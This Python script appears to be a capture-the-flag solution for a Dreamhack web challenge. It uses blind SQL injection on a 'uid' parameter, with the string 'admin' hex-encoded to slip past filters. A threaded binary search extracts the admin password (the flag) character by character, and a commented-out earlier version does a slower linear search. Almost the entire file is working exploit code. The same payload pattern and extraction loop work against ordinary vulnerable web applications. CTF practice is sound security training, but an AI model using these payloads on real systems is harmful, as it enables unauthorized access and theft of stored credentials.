# import requests
# import string

# charset = string.ascii_letters + string.digits + '{}'

# URL = "http://host3.dreamhack.games:14575/"
# PROXIE = {'http':'http://localhost:8080'}

# def bynary_search(low, high):
#     while(low < high):
#         mid = (low + high) // 2
#         payload = f"xx'||uid=0x61646d696e&&length(upw)>{mid}||'"
#         res = requests.get(URL,params={'uid':payload}, proxies=PROXIE)
#         if res.status_code == 200 and "admin" in res.text:
#             low = mid + 1
#         else:
#             high = mid
#     return low

# len_upw = 44
# flag = "DH{"
# for i in range(4,45):
#     for c in charset:
#         payload = f"xxx'||uid=0x61646d696e&&substring(upw,{i},1)='{c}"
#         res = requests.get(URL,params={'uid':payload}, proxies=PROXIE)
#         if res.status_code == 200 and "admin" in res.text:
#             flag += c
#             print(flag)
#             break


# print(flag)

import concurrent.futures
import requests

URL = "http://host3.dreamhack.games:14575/"
PROXIES = {'http': 'http://localhost:8080'}

def pwn_char(pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"xxx'||uid=0x61646d696e&&ascii(substring(upw,{pos},1))>{mid}||'"
        try:
            res = requests.get(URL, params={'uid': payload}, proxies=PROXIES, timeout=5)
            if res.status_code == 200 and "admin" in res.text:
                low = mid + 1
            else:
                high = mid - 1
        except requests.RequestException:
            pass
    return pos, chr(low)

def main():
    start_pos = 4
    end_pos = 44
    results = {}
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_pos = {executor.submit(pwn_char, pos): pos for pos in range(start_pos, end_pos + 1)}
        for future in concurrent.futures.as_completed(future_to_pos):
            try:
                pos, char = future.result()
                results[pos] = char
                current_flag = "DH{" + "".join(results.get(i, "?") for i in range(start_pos, end_pos + 1))
                print(f"[+] Progress: {current_flag}", end="\r")
            except Exception:
                pass

    final_flag = "DH{" + "".join(results.get(i, "") for i in range(start_pos, end_pos + 1))
    print(f"\n\n[===] FINAL FLAG: {final_flag}")

if __name__ == "__main__":
    main()
